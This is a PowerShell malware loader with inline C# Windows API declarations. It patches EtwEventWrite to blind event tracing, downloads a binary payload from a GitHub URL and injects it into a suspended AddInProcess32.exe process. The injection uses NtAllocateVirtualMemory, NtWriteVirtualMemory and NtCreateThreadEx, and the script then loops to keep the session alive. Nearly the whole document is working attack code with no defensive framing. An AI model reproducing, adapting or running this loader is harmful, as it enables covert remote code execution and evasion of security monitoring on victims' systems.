$code = @"
using System;
using System.Runtime.InteropServices;

public class Loader {
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("kernel32", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("ntdll", SetLastError=true)]
    public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, uint AllocationType, uint Protect);
    
    [DllImport("ntdll", SetLastError=true)]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
    
    [DllImport("ntdll", SetLastError=true)]
    public static extern int NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr BytesBuffer);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint CREATE_SUSPENDED = 0x4;
    public const uint CREATE_NO_WINDOW = 0x8000000;
}
"@

Write-Host "[*] Compiling inline C# assembly..." -ForegroundColor Cyan
Add-Type -TypeDefinition $code -Language CSharp
Write-Host "[+] Inline assembly compiled successfully" -ForegroundColor Green

# Step 2: ETW Blinding
Write-Host "[*] Loading ntdll.dll..." -ForegroundColor Cyan
$ntdll = [Loader]::LoadLibrary("nt" + "dll")
if ($ntdll -eq [IntPtr]::Zero) {
    Write-Host "[-] Failed to load ntdll.dll" -ForegroundColor Red
    exit
}
Write-Host "[+] ntdll.dll loaded at: 0x$($ntdll.ToString("X"))" -ForegroundColor Green

Write-Host "[*] Resolving EtwEventWrite..." -ForegroundColor Cyan
$etwAddr = [Loader]::GetProcAddress($ntdll, "EtwEventWrite")
if ($etwAddr -eq [IntPtr]::Zero) {
    Write-Host "[-] Failed to resolve EtwEventWrite" -ForegroundColor Red
    exit
}
Write-Host "[+] EtwEventWrite found at: 0x$($etwAddr.ToString("X"))" -ForegroundColor Green

Write-Host "[*] Patching EtwEventWrite (0xC3 RET)..." -ForegroundColor Cyan
$oldProtect = 0
$vp = [Loader]::VirtualProtect($etwAddr, [UIntPtr]::new(1), [Loader]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
if (-not $vp) {
    Write-Host "[-] VirtualProtect failed on EtwEventWrite" -ForegroundColor Red
    exit
}
[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)
[Loader]::VirtualProtect($etwAddr, [UIntPtr]::new(1), $oldProtect, [ref]$oldProtect) | Out-Null
Write-Host "[+] ETW successfully blinded" -ForegroundColor Green

# Step 3: Payload Delivery
Write-Host "[*] Downloading payload from wire..." -ForegroundColor Cyan
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$url = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin"
try {
    $shellcode = $wc.DownloadData($url)
    Write-Host "[+] Payload downloaded: $($shellcode.Length) bytes" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to download payload: $_" -ForegroundColor Red
    exit
}

if ($shellcode.Length -eq 0) {
    Write-Host "[-] Payload is empty (0 bytes)" -ForegroundColor Red
    exit
}

# Step 4: Process Creation - Hunt for AddInProcess32.exe
Write-Host "[*] Hunting for AddInProcess32.exe on disk..." -ForegroundColor Cyan

$searchPaths = @(
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe",
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddInProcess32.exe",
    "C:\Windows\Microsoft.NET\Framework\v2.0.50727\AddInProcess32.exe",
    "C:\Windows\Microsoft.NET\Framework64\v2.0.50727\AddInProcess32.exe"
)

$targetPath = $null
foreach ($candidate in $searchPaths) {
    if (Test-Path $candidate) {
        $targetPath = $candidate
        Write-Host "[+] Found executable at: $targetPath" -ForegroundColor Green
        break
    } else {
        Write-Host "[-] Not found: $candidate" -ForegroundColor DarkGray
    }
}

if (-not $targetPath) {
    Write-Host "[-] AddInProcess32.exe not found in any standard location" -ForegroundColor Red
    Write-Host "[!] Please verify the path and update the script manually" -ForegroundColor Yellow
    exit
}

Write-Host "[*] Spawning sacrificial process..." -ForegroundColor Cyan
$si = New-Object Loader+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object Loader+PROCESS_INFORMATION

Write-Host "    lpApplicationName: $targetPath" -ForegroundColor DarkGray
Write-Host "    lpCommandLine: (empty)" -ForegroundColor DarkGray
Write-Host "    CreationFlags: CREATE_SUSPENDED | CREATE_NO_WINDOW" -ForegroundColor DarkGray

$cp = [Loader]::CreateProcess($targetPath, "", [IntPtr]::Zero, [IntPtr]::Zero, $false, [Loader]::CREATE_SUSPENDED -bor [Loader]::CREATE_NO_WINDOW, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$si, [ref]$pi)
if (-not $cp) {
    $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Host "[-] CreateProcess failed with Win32 error: $err" -ForegroundColor Red
    exit
}
Write-Host "[+] Process created: PID $($pi.dwProcessId)" -ForegroundColor Green
Write-Host "[+] Process handle: 0x$($pi.hProcess.ToString("X"))" -ForegroundColor Green
Write-Host "[+] Main thread handle: 0x$($pi.hThread.ToString("X"))" -ForegroundColor Green

# Step 5: Memory Allocation and Injection
Write-Host "[*] Allocating memory in target process..." -ForegroundColor Cyan
$baseAddr = [IntPtr]::Zero
$regionSize = [UIntPtr]::new($shellcode.Length)
$ntStatus = [Loader]::NtAllocateVirtualMemory($pi.hProcess, [ref]$baseAddr, [IntPtr]::Zero, [ref]$regionSize, [Loader]::MEM_COMMIT -bor [Loader]::MEM_RESERVE, [Loader]::PAGE_EXECUTE_READWRITE)
if ($ntStatus -ne 0) {
    Write-Host "[-] NtAllocateVirtualMemory failed with status: 0x$($ntStatus.ToString("X8"))" -ForegroundColor Red
    exit
}
Write-Host "[+] Memory allocated at: 0x$($baseAddr.ToString("X"))" -ForegroundColor Green
Write-Host "[+] Allocated size: $($regionSize.ToUInt64()) bytes" -ForegroundColor Green

Write-Host "[*] Writing payload into target memory..." -ForegroundColor Cyan
$written = 0
$ntStatus = [Loader]::NtWriteVirtualMemory($pi.hProcess, $baseAddr, $shellcode, [UInt32]$shellcode.Length, [ref]$written)
if ($ntStatus -ne 0) {
    Write-Host "[-] NtWriteVirtualMemory failed with status: 0x$($ntStatus.ToString("X8"))" -ForegroundColor Red
    exit
}
if ($written -ne $shellcode.Length) {
    Write-Host "[-] Partial write detected: $written / $($shellcode.Length) bytes" -ForegroundColor Red
    exit
}
Write-Host "[+] Wrote $written bytes into process memory" -ForegroundColor Green

Write-Host "[*] Creating remote execution thread..." -ForegroundColor Cyan
$hThread = [IntPtr]::Zero
$ntStatus = [Loader]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $pi.hProcess, $baseAddr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
if ($ntStatus -ne 0) {
    Write-Host "[-] NtCreateThreadEx failed with status: 0x$($ntStatus.ToString("X8"))" -ForegroundColor Red
    exit
}
Write-Host "[+] Remote thread created: handle 0x$($hThread.ToString("X"))" -ForegroundColor Green
Write-Host "[+] Thread entry point: 0x$($baseAddr.ToString("X"))" -ForegroundColor Green

# Step 6: Session Execution Maintenance
Write-Host "[*] Entering maintenance loop to keep session alive..." -ForegroundColor Cyan
Write-Host "[!] Payload is executing inside PID $($pi.dwProcessId)" -ForegroundColor Yellow
while ($true) { Start-Sleep -Seconds 60 }